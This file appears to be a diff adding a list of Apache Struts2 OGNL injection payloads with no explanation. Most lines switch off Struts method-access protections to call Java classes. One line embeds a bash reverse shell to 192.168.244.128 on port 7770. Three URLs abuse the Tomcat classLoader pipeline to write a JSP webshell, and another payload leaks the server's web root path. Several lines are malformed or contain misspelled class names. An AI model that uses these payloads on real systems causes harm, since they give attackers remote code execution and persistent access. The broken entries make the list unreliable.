@@ -1,0 +1,28 @@
+%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().getResourceAsStream("~/test.txt")}
+%{#em=@javax.persistence.Persistence@createEntityManagerFactory("test").createEntityManager(),#em.createQuery("select*fromStudent")}
+%{#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.io.FilterWriter@available()}
+%{#_memberAccess.allowStaticMethodAccess=true,@java.io.RandomAccessFile.close()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.persistence.EntityManager@remove("")
+%{#_memberAccess['allowPrivateAccess']=true,@java.io.CharArrayWriter.append('c')
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.script.ScriptEngineManage@getEngineByName("JavaScript")
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.servlet.ServletContext@removeAttribute(Stringname)
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,java.lang.ThreadLocal@remove()
+<command><string>bash</string><string>-c</string><string>bash-i>&amp;/dev/tcp/192.168.244.128/7770>&amp;1</string></command>
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=@sun.misc.Unsafe.class.getDeclaredField("theUnsafe"),#f.setAccessible(true),#unsafe=#f.get(null)}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.inheritableThreadlocal.get()
+%{#a=new java.lang.ThreadLocal(@OverrideprotectedConnectioninitialValu(){returncreateConnection();})a.initialValue()}
+%{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),java.io.Console@readPassword()}
+%{#_memberAccess.allowStaticMethodAccess=true,#excludeProperties=@java.util.Collections@EMPTY_SET@java.io.FilteroutStream@close()}
+redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter(),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}
+http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.prefix=shell
+http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+%{@com.opensymphony.xwork.ActionContext@getContext()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new javax.persistence.EntityManager(){publicvoidclear(){}}.clear()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Package().getImplementationTitle()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Package().getImplementationVendor()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=@java.lang.Package@getPackage("")}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@com.atlassian.core.util.ClassHelper@instantiateClass(a,b)}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=@com.atlassian.core.util.ClassLoaderUtilsloadClass@loadClass(a,b)}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.ThreadLocal(@OverrideprotectedConnectioninitialValue(){returncreateConnection();})a.initialValue()}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.servlet.ServletContext@removeAttribute(Stringname)}
